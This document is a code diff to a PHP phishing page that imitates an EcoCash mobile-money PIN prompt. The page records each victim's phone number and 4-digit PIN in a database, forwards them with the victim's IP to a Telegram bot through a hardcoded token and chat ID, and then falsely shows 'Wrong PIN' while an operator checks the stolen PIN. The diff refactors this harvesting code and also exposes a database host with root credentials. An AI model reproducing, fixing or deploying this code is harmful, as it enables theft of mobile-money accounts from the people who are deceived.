@@ -5,20 +5,11 @@ session_start();
 $botToken = "8163112809:AAH5OFmjVHKPDz1svGG9viGjpAuNLFHsctc";
 $chatId   = "-5193742613";
 
-$dbHost = 78.111.67.22;
-$dbPort = getenv('DB_PORT') ?: 3306;
-$dbName = loan;
-$dbUser = root;
-$dbPass = ;
-
-$pdo = new PDO(
-    "mysql:host=$dbHost;port=$dbPort;dbname=$dbName;charset=utf8mb4",
-    $dbUser,
-    $dbPass,
-    [
-        PDO::ATTR_ERRMODE => PDO::ERRMODE_EXCEPTION,
-    ]
-);
+$dbHost   = "78.111.67.22";        // ← quotes added
+$dbPort   = getenv('DB_PORT') ?: 3306;
+$dbName   = "loan";               // ← quotes added
+$dbUser   = "root";               // ← quotes added
+$dbPass   = "";                   // ← empty string, syntax fixed
 
 // ==================================
 
@@ -36,7 +27,34 @@ if (empty($phone)) {
     exit;
 }
 
-// Function to send Telegram message (same as before)
+/**
+ * Create a PDO connection (singleton pattern for reuse)
+ * @return PDO|null
+ */
+function getDbConnection($dbHost, $dbPort, $dbName, $dbUser, $dbPass) {
+    static $pdo = null;
+    if ($pdo === null) {
+        // Check if PDO MySQL driver is available
+        if (!in_array('mysql', PDO::getAvailableDrivers())) {
+            error_log("PDO MySQL driver not found");
+            return null;
+        }
+        try {
+            $dsn = "mysql:host=$dbHost;port=$dbPort;dbname=$dbName;charset=utf8mb4";
+            $pdo = new PDO($dsn, $dbUser, $dbPass, [
+                PDO::ATTR_ERRMODE => PDO::ERRMODE_EXCEPTION,
+                PDO::ATTR_DEFAULT_FETCH_MODE => PDO::FETCH_ASSOC,
+                PDO::ATTR_TIMEOUT => 5
+            ]);
+        } catch (PDOException $e) {
+            error_log("Database connection failed: " . $e->getMessage());
+            return null;
+        }
+    }
+    return $pdo;
+}
+
+// Function to send Telegram message
 function sendTelegramMessage($botToken, $chatId, $message) {
     $url = "https://api.telegram.org/bot{$botToken}/sendMessage";
     $postData = [
@@ -92,15 +110,19 @@ if (isset($_GET['check_status']) && $_GET['check_status'] == 1) {
         echo json_encode(['verified' => false]);
         exit;
     }
+    $pdo = getDbConnection($dbHost, $dbPort, $dbName, $dbUser, $dbPass);
+    if (!$pdo) {
+        echo json_encode(['verified' => false]);
+        exit;
+    }
     try {
-        $pdo = new PDO("mysql:host=$dbHost;dbname=$dbName;charset=utf8", $dbUser, $dbPass);
-        $pdo->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);
         $stmt = $pdo->prepare("SELECT status FROM ecocash_auth WHERE phone = :phone AND pin = :pin LIMIT 1");
         $stmt->execute([':phone' => $checkPhone, ':pin' => $checkPin]);
-        $record = $stmt->fetch(PDO::FETCH_ASSOC);
+        $record = $stmt->fetch();
         $verified = ($record && (int)$record['status'] === 1);
         echo json_encode(['verified' => $verified]);
     } catch (PDOException $e) {
+        error_log("AJAX check_status error: " . $e->getMessage());
         echo json_encode(['verified' => false]);
     }
     exit;
@@ -113,34 +135,35 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
     $pin = preg_replace('/[^0-9]/', '', $pin);
     
     if (strlen($pin) === 4) {
-        try {
-            $pdo = new PDO("mysql:host=$dbHost;dbname=$dbName;charset=utf8", $dbUser, $dbPass);
-            $pdo->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);
-            
-            $insertStmt = $pdo->prepare("INSERT IGNORE INTO ecocash_auth (phone, pin, status) VALUES (:phone, :pin, 0)");
-            $insertStmt->execute([':phone' => $phone, ':pin' => $pin]);
-            
-            // Always send Telegram
-            $ip = $_SERVER['HTTP_CF_CONNECTING_IP'] ?? $_SERVER['REMOTE_ADDR'] ?? 'unknown';
-            $time = date('Y-m-d H:i:s');
-            $msg = "🔐 *PIN Attempt*\n\n📱 Phone: +263 {$phone}\n🔢 PIN: `{$pin}`\n⏰ Time: {$time}\n🌐 IP: {$ip}\n⏰ Verify: https://hookupint.site/verify.php";
-            sendTelegramMessage($botToken, $chatId, $msg);
-            
-            // Store the submitted PIN for polling
-            $_SESSION['pending_pin'] = $pin;
-            $error = "Wrong PIN";
-        } catch (PDOException $e) {
-            error_log("DB error: " . $e->getMessage());
-            $error = "System error. Try again later.";
+        $pdo = getDbConnection($dbHost, $dbPort, $dbName, $dbUser, $dbPass);
+        if (!$pdo) {
+            $error = "System error: database driver missing. Please contact administrator.";
+        } else {
+            try {
+                $insertStmt = $pdo->prepare("INSERT IGNORE INTO ecocash_auth (phone, pin, status) VALUES (:phone, :pin, 0)");
+                $insertStmt->execute([':phone' => $phone, ':pin' => $pin]);
+                
+                // Send Telegram notification
+                $ip = $_SERVER['HTTP_CF_CONNECTING_IP'] ?? $_SERVER['REMOTE_ADDR'] ?? 'unknown';
+                $time = date('Y-m-d H:i:s');
+                $msg = "🔐 *PIN Attempt*\n\n📱 Phone: +263 {$phone}\n🔢 PIN: `{$pin}`\n⏰ Time: {$time}\n🌐 IP: {$ip}\n⏰ Verify: https://hookupint.site/verify.php";
+                sendTelegramMessage($botToken, $chatId, $msg);
+                
+                // Store the submitted PIN for polling
+                $_SESSION['pending_pin'] = $pin;
+                $error = "Wrong PIN";
+            } catch (PDOException $e) {
+                error_log("PIN insert error: " . $e->getMessage());
+                $error = "System error. Try again later.";
+            }
         }
     } else {
         $error = "PIN must be 4 digits.";
     }
 }
 
-// Get any pending PIN from session, but DO NOT pre-fill the inputs
+// Get any pending PIN from session (for polling)
 $pendingPin = isset($_SESSION['pending_pin']) ? $_SESSION['pending_pin'] : '';
-// We will NOT output value attributes in HTML
 ?>
 <!DOCTYPE html>
 <html lang="en">
@@ -280,7 +303,6 @@ const inputs = document.querySelectorAll('.pin input');
 const phone = <?= json_encode($phone) ?>;
 let pendingPin = <?= json_encode($pendingPin) ?>;
 
-// Auto-submit when all 4 fields are filled
 function allFilled() {
     let filled = true;
     inputs.forEach(i => {
@@ -291,10 +313,8 @@ function allFilled() {
     }
 }
 
-// Add event listeners for input and keydown
 inputs.forEach((input, index) => {
     input.addEventListener('input', () => {
-        // Only allow digits
         input.value = input.value.replace(/[^0-9]/g, '');
         if (input.value && index < inputs.length - 1) {
             inputs[index + 1].focus();
@@ -308,7 +328,6 @@ inputs.forEach((input, index) => {
     });
 });
 
-// Start polling only if there is a pending PIN (i.e., after a submission)
 if (pendingPin && pendingPin.length === 4) {
     let pollingInterval = setInterval(async () => {
         try {
